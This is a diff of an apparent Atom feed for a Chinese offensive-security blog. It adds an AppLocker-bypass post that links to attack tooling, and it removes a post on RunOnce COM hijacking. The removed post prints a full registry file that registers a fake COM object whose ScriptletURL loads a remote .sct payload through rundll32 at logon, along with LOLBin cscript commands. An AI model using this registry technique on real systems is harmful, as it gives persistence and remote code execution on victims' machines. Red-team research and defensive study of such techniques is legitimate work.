@@ -67,6 +67,24 @@
   </entry>
   
   <entry>
+    <title>tasks-applocker</title>
+    <link href="www.ggsec.cn/tasks-applocker.html"/>
+    <id>www.ggsec.cn/tasks-applocker.html</id>
+    <published>2020-01-13T12:54:05.000Z</published>
+    <updated>2020-01-13T12:59:04.609Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20200113_205107.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/tasks-applocker.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2FB2F421A216895DE0E008689718267E.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/B77FA210C19DE4A80C6CE736992E1784.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/06EB8C3217058BAC8EC0273C8A7B3E97.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/24D2E364BE58B38B8F56F0BCE74DF2AE.png" alt="enter description here"></p><p><a href="https://gist.github.com/am0nsec/8378da08f848424e4ab0cc5b317fdd26" target="_blank" rel="noopener">https://gist.github.com/am0nsec/8378da08f848424e4ab0cc5b317fdd26</a><br><a href="https://twitter.com/subTee/status/1216465628946563073" target="_blank" rel="noopener">https://twitter.com/subTee/status/1216465628946563073</a><br><a href="https://github.com/demonsec666/attack_golang/blob/master/TASKS_LOLBIN/main.go" target="_blank" rel="noopener">https://github.com/demonsec666/attack_golang/blob/master/TASKS_LOLBIN/main.go</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20200113_205107.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>TrelloC2</title>
     <link href="www.ggsec.cn/TrelloC2.html"/>
     <id>www.ggsec.cn/TrelloC2.html</id>
@@ -414,28 +432,6 @@
     <summary type="html">
     
       &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/98C6DE4E4A0C386E511C104DBCE04BE4.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
-    
-    
-      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>runonce-com-hijacking</title>
-    <link href="www.ggsec.cn/runonce-com-hijacking.html"/>
-    <id>www.ggsec.cn/runonce-com-hijacking.html</id>
-    <published>2019-06-10T01:53:12.000Z</published>
-    <updated>2019-06-10T13:56:50.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20181017_121520.jpg" alt="enter description here"><br><a id="more"></a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F8C65C239CD6D13EBF6E936E8ECF7297.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6B932C450A5633C53CCB205BF5C5E66D.jpg" alt="enter description here"></p><p><a href="https://twitter.com/harr0ey/status/1052405330402074624" target="_blank" rel="noopener">https://twitter.com/harr0ey/status/1052405330402074624</a><br><a href="https://gist.github.com/homjxi0e/66555fedc78af49635b2e5dfea9dd1ae" target="_blank" rel="noopener">https://gist.github.com/homjxi0e/66555fedc78af49635b2e5dfea9dd1ae</a><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce]</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\setup]</span><br><span class="line">@=<span class="string">"rundll32 xwizards.dll,RunPropertySheet /u &#123;00000001-0000-0000-0000-0000FEEDACDC&#125;"</span></span><br><span class="line"><span class="string">"COM Hijacking"</span>=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary]</span><br><span class="line">@=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary\CLSID]</span><br><span class="line">@=<span class="string">"&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;]</span><br><span class="line">@=<span class="string">"Scripting.Dictionary"</span></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\InprocServer32]</span><br><span class="line">@=<span class="string">"C:\\WINDOWS\\system32\\scrobj.dll"</span></span><br><span class="line"><span class="string">"ThreadingModel"</span>=<span class="string">"Apartment"</span></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\ProgID]</span><br><span class="line">@=<span class="string">"Scripting.Dictionary"</span></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\ScriptletURL]</span><br><span class="line">@=<span class="string">"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct"</span></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\VersionIndependentProgID]</span><br><span class="line">@=<span class="string">"Scripting.Dictionary"</span></span><br></pre></td></tr></table></figure></p><h2 id="2-prmcnfg-vbs"><a href="#2-prmcnfg-vbs" class="headerlink" title="2 prmcnfg.vbs"></a>2 prmcnfg.vbs</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cscript C:\Windows\System32\Printing_Admin_Scripts\zh-CN\prncnfg.vbs /?</span><br><span class="line">cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\prncnfg.vbs /?</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/D8lfnlKUIAYsPBB.jpg" alt="enter description here"></p><p><a href="https://twitter.com/harr0ey/status/1137443710197817344" target="_blank" rel="noopener">https://twitter.com/harr0ey/status/1137443710197817344</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20181017_121520.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
     
     </summary>
     
